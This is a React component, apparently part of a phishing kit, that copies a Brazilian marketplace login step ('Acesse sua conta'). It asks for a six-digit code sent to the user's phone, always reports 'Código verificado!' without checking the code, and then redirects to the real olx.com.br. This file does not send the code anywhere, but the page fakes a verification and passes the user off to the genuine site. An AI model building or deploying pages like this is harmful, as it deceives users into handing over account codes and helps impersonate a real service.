import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Mail, Info } from 'lucide-react';
import { toast } from "sonner";

const VerifyCode = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState(["", "", "", "", "", ""]);
    const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
    const phone = localStorage.getItem("user_phone");

    useEffect(() => {
        inputRefs.current[0]?.focus();
    }, []);

    const handleChange = (index: number, value: string) => {
        if (value.length > 1) {
            value = value[0];
        }

        if (!/^\d*$/.test(value)) return;

        const newCode = [...code];
        newCode[index] = value;
        setCode(newCode);

        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }

        // Auto submit when all 6 digits are filled
        if (newCode.every(digit => digit !== "") && index === 5) {
            setTimeout(() => {
                toast.success("Código verificado!");
              window.location.href = "https://www.olx.com.br";
            }, 500);
        }
    };

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !code[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleResend = () => {
        toast.success("Código reenviado!");
        setCode(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
    };


    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">

            <div className="w-full max-w-md bg-white rounded-2xl shadow-sm border border-gray-200 p-8">
                <div className="space-y-6">
                    {/* Header */}
                    <div className="text-center">
                        <h1 className="text-2xl font-semibold text-gray-900 mb-3">
                            Acesse sua conta
                        </h1>
                        <p className="text-sm text-gray-600">
                            Digite o código enviado para
                        </p>
                        <p className="text-sm text-gray-900 font-medium mt-1">
                           {phone}
                        </p>
                    </div>

                    {/* Code Input */}
                    <div className="flex gap-2 justify-center">
                        {code.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => (inputRefs.current[index] = el)}
                                type="text"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                onChange={(e) => handleChange(index, e.target.value)}
                                onKeyDown={(e) => handleKeyDown(index, e)}
                                className="w-12 h-14 text-center text-xl font-semibold rounded-lg border-2 border-gray-300 transition-all focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 hover:border-gray-400"
                            />
                        ))}
                    </div>

                    {/* Resend Link */}
                    <div className="text-left">
                        <button
                            onClick={handleResend}
                            className="text-sm text-indigo-600 hover:text-indigo-700 hover:underline font-medium"
                        >
                            Reenviar código
                        </button>
                    </div>

                    {/* Info Messages */}
                    <div>
                        <div className="space-y-3 bg-gray-50 rounded-lg p-4 mb-2">
                            <div className="flex gap-3 items-start">
                                <Mail className="w-5 h-5 text-gray-600 flex-shrink-0 mt-0.5" />
                                <p className="text-sm text-gray-700">
                                    Caso não tenha encontrado o e-mail, verifique sua caixa de Spam.
                                </p>
                            </div>
                        </div>

                        <div className="space-y-3 bg-gray-50 rounded-lg p-4" >
                            <div className="flex gap-3 items-start">
                                <Info className="w-5 h-5 text-gray-600 flex-shrink-0 mt-0.5" />
                                <p className="text-sm text-gray-700">
                                    O código é privado. Não compartilhe essa informação com ninguém.
                                </p>
                            </div>
                        </div>

                    </div>

                    {/* Back Button */}
                    <div className="text-left  pt-2">
                        <button
                            onClick={() => navigate('/auth')}
                            className="text-sm text-indigo-600 hover:text-indigo-700 hover:underline font-medium"
                        >
                            Voltar
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default VerifyCode;
